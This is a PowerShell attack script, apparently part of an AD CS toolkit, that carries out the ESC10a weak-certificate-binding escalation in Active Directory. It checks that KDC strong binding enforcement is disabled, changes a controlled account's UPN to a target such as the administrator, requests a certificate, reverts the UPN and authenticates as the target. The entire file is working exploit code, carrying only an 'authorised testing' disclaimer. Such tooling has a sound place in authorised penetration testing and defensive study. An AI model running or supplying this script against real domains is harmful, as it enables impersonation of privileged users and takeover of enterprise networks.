<#
.SYNOPSIS
    AD CS ESC10a - Weak Certificate Binding (Enforcement Disabled) (LOLBAS).
.DESCRIPTION
    Exploits StrongCertificateBindingEnforcement = 0 (disabled).
    Chains to ESC9 flow (UPN swap + certificate request).
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER TemplateName
    Enrollable certificate template
.PARAMETER AccountToModify
    Account you have GenericWrite over (sAMAccountName)
.PARAMETER TargetUPN
    UPN of the user to impersonate
.EXAMPLE
    .\Invoke-ESC10a.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "User" -AccountToModify "svc-account" -TargetUPN "administrator@zsec.red"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$TemplateName,
    [Parameter(Mandatory)] [string]$AccountToModify,
    [Parameter(Mandatory)] [string]$TargetUPN,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth,
    [switch]$SkipCleanup
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC10a Standalone" -ForegroundColor White
Write-Host "  ----------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC10a" "Weak Binding - Enforcement Disabled"

Write-Stage -Number 1 -Name "RECONNAISSANCE"
try {
    $val = (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' `
        -Name 'StrongCertificateBindingEnforcement' -ErrorAction Stop).StrongCertificateBindingEnforcement
    if ($val -ne 0) {
        Write-Host "    [-] StrongCertificateBindingEnforcement = $val (need 0)" -ForegroundColor Red
        Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'FAILED'; exit 1
    }
    Write-Host "    [+] StrongCertificateBindingEnforcement = 0 (DISABLED)" -ForegroundColor Green
} catch {
    Write-Host "    [!] Registry key not found (defaults to 1)" -ForegroundColor Yellow
    Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'FAILED'; exit 1
}
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

# Chain to ESC9 flow (UPN swap + cert request)
Write-Host "    [i] Chaining to ESC9 flow (UPN swap + cert request)" -ForegroundColor Cyan
Write-Host ""

# STAGE 2: UPN SWAP
Write-Stage -Number 2 -Name "POSITIONING - UPN Manipulation"
$targetUser = Get-ADUser -Identity $AccountToModify -Properties userPrincipalName
$originalUPN = $targetUser.userPrincipalName
Write-Host "    [>] Original UPN: $originalUPN" -ForegroundColor Gray
Write-Host "    [>] Setting UPN to: $TargetUPN" -ForegroundColor Yellow
Set-ADUser -Identity $AccountToModify -UserPrincipalName $TargetUPN
Start-Sleep -Seconds 2
Write-Host "    [+] UPN changed" -ForegroundColor Green
Write-Stage -Number 2 -Name "POSITIONING" -Status 'COMPLETE'

# STAGE 3: REQUEST
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST"
$inf = New-CertRequestINF -Subject "CN=$AccountToModify" -Template $TemplateName `
    -OutFile "$OutputDir\esc10a.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc10a"

# IMMEDIATELY revert UPN
Write-Host "    [>] Reverting UPN to: $originalUPN" -ForegroundColor Yellow
if ($originalUPN) {
    Set-ADUser -Identity $AccountToModify -UserPrincipalName $originalUPN
} else {
    Set-ADUser -Identity $AccountToModify -Clear userPrincipalName
}
Write-Host "    [+] UPN reverted" -ForegroundColor Green

if (-not $result.Success) { Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED'; exit 1 }
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE'

Write-Host ""
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION"
Write-Host "    [i] Enforcement disabled - KDC accepts any certificate mapping" -ForegroundColor Cyan
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget

if (-not $SkipCleanup) {
    Write-Host ""
    Write-Stage -Number 6 -Name "CLEANUP"
    Write-Host "    [+] UPN already reverted in Stage 3" -ForegroundColor Green
    Write-Stage -Number 6 -Name "CLEANUP" -Status 'COMPLETE'
}

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
